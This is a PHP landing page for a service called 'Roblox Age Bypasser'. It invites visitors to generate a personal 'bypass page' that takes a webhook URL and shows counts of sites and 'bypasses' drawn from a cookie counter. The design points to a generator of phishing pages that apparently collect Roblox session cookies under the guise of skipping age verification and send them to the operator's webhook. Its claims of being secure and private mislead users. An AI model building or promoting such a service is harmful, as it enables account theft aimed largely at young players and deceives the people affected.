<?php
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../functions.php';

// Track visit
updateGlobalStats('totalVisits');

$globalStats = getGlobalStats();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <title>Roblox Age Bypasser - Free Cookie Bypass Generator</title>
    <meta name="description" content="Generate your own Roblox age bypasser instance. Secure, fast, and completely free.">
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --font-sans: 'Outfit', sans-serif;
            --font-display: 'Space Grotesk', sans-serif;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: var(--font-sans);
            background: linear-gradient(135deg, #02040a 0%, #0a0e27 50%, #02040a 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            -webkit-backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }
        
        .animated-gradient-text {
            background: linear-gradient(90deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #667eea 75%, #764ba2 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientFlow 3s linear infinite;
        }
        
        @keyframes gradientFlow {
            0% { background-position: 0% center; }
            100% { background-position: 200% center; }
        }

        .hover-lift {
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .hover-lift:hover {
            transform: translateY(-4px);
            box-shadow: 0 20px 40px rgba(102, 126, 234, 0.4);
        }

        .pulse-glow {
            animation: pulseGlow 2s ease-in-out infinite;
        }

        @keyframes pulseGlow {
            0%, 100% {
                box-shadow: 0 0 20px rgba(102, 126, 234, 0.3);
            }
            50% {
                box-shadow: 0 0 40px rgba(102, 126, 234, 0.6);
            }
        }
    </style>
</head>
<body class="bg-[#02040a] text-white overflow-x-hidden">
    <div class="container max-w-4xl mx-auto px-4 py-12 flex flex-col items-center min-h-screen">
        <!-- Header Section -->
        <div class="text-center mb-16 space-y-6">
            <div class="relative inline-block">
                <div class="absolute inset-0 bg-white/20 blur-2xl rounded-full"></div>
                <div class="relative w-20 h-20 bg-white/5 border border-white/10 rounded-2xl flex items-center justify-center backdrop-blur-sm shadow-2xl glass-effect">
                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="text-white">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    </svg>
                </div>
            </div>
            
            <h1 class="text-5xl md:text-6xl font-display font-bold tracking-tight text-glow animated-gradient-text">
                Roblox Age Bypasser
            </h1>
            
            <p class="text-white/60 text-xl max-w-2xl mx-auto">
                Secure and efficient age verification bypass. Generate your own private instance in seconds.
            </p>

            <!-- Stats Bar -->
            <div class="inline-flex items-center gap-6 px-6 py-3 bg-white/5 border border-white/10 rounded-full glass-effect">
                <div class="flex items-center gap-2">
                    <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                    <span class="text-white/80 text-sm font-medium">Online</span>
                </div>
                <div class="w-px h-4 bg-white/20"></div>
                <div class="text-white/60 text-sm">
                    <span class="font-bold text-white"><?php echo number_format($globalStats['totalSites'] ?? 0); ?></span> Active Sites
                </div>
                <div class="w-px h-4 bg-white/20"></div>
                <div class="text-white/60 text-sm">
                    <span class="font-bold text-white"><?php echo number_format($globalStats['totalCookies'] ?? 0); ?></span> Total Bypasses
                </div>
            </div>
        </div>

        <!-- Main CTA Card -->
        <div class="w-full max-width-2xl mb-12">
            <div class="relative">
                <div class="absolute inset-0 bg-gradient-to-r from-purple-500/20 to-blue-500/20 blur-3xl rounded-[2.5rem]"></div>
                <div class="relative bg-black/40 backdrop-blur-xl border border-white/10 p-8 md:p-12 rounded-[2.5rem] shadow-2xl glass-effect text-center space-y-6">
                    <div class="inline-block p-4 bg-gradient-to-br from-purple-500/20 to-blue-500/20 rounded-2xl mb-4">
                        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-purple-400">
                            <circle cx="12" cy="12" r="10"/>
                            <line x1="12" y1="8" x2="12" y2="16"/>
                            <line x1="8" y1="12" x2="16" y2="12"/>
                        </svg>
                    </div>

                    <div class="space-y-3">
                        <h2 class="text-3xl md:text-4xl font-bold">Create Your Own Instance</h2>
                        <p class="text-white/60 text-lg max-w-lg mx-auto">
                            Get your personalized bypass page with full dashboard access and webhook notifications.
                        </p>
                    </div>

                    <div class="flex flex-col sm:flex-row gap-4 justify-center items-center pt-4">
                        <a href="/generator/" class="group relative inline-flex items-center justify-center gap-3 px-8 py-4 bg-gradient-to-r from-purple-500 to-blue-500 hover:from-purple-600 hover:to-blue-600 text-white rounded-2xl font-bold text-lg transition-all hover-lift pulse-glow">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="group-hover:rotate-90 transition-transform duration-300">
                                <circle cx="12" cy="12" r="10"/>
                                <line x1="12" y1="8" x2="12" y2="16"/>
                                <line x1="8" y1="12" x2="16" y2="12"/>
                            </svg>
                            Generate Instance
                        </a>

                        <a href="/dashboard/sign-in.php" class="inline-flex items-center justify-center gap-2 px-8 py-4 bg-white/10 hover:bg-white/15 border border-white/20 text-white rounded-2xl font-semibold text-lg transition-all hover-lift">
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/>
                                <polyline points="10 17 15 12 10 7"/>
                                <line x1="15" y1="12" x2="3" y2="12"/>
                            </svg>
                            Sign In
                        </a>
                    </div>
                </div>
            </div>
        </div>

        <!-- Features Grid -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 w-full max-w-5xl mb-16">
            <!-- Feature 1 -->
            <div class="bg-white/5 border border-white/10 rounded-2xl p-6 glass-effect hover-lift">
                <div class="w-12 h-12 bg-gradient-to-br from-green-500/20 to-emerald-500/20 rounded-xl flex items-center justify-center mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-green-400">
                        <polyline points="20 6 9 17 4 12"/>
                    </svg>
                </div>
                <h3 class="text-xl font-bold mb-2">Instant Setup</h3>
                <p class="text-white/60">Generate your instance in seconds with just a webhook URL and custom name.</p>
            </div>

            <!-- Feature 2 -->
            <div class="bg-white/5 border border-white/10 rounded-2xl p-6 glass-effect hover-lift">
                <div class="w-12 h-12 bg-gradient-to-br from-blue-500/20 to-cyan-500/20 rounded-xl flex items-center justify-center mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-blue-400">
                        <rect x="3" y="3" width="18" height="18" rx="2"/>
                        <path d="M3 9h18"/>
                        <path d="M9 21V9"/>
                    </svg>
                </div>
                <h3 class="text-xl font-bold mb-2">Full Dashboard</h3>
                <p class="text-white/60">Track stats, manage settings, and view analytics in real-time.</p>
            </div>

            <!-- Feature 3 -->
            <div class="bg-white/5 border border-white/10 rounded-2xl p-6 glass-effect hover-lift">
                <div class="w-12 h-12 bg-gradient-to-br from-purple-500/20 to-pink-500/20 rounded-xl flex items-center justify-center mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-purple-400">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                    </svg>
                </div>
                <h3 class="text-xl font-bold mb-2">100% Private</h3>
                <p class="text-white/60">Your data stays yours. Private webhooks, secure storage, no logging.</p>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center space-y-4 mt-auto pt-12">
            <div class="flex items-center justify-center gap-2 text-sm text-white/40">
                <span>Status:</span>
                <div class="flex items-center gap-1.5 px-3 py-1 bg-green-500/10 border border-green-500/20 rounded-full glass-effect">
                    <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></div>
                    <span class="text-green-500 text-xs font-bold uppercase">Online</span>
                </div>
            </div>
            <p class="text-white/30 text-sm">
                © <?php echo date('Y'); ?> Roblox Age Bypasser. All rights reserved.
            </p>
        </div>
    </div>
</body>
</html>

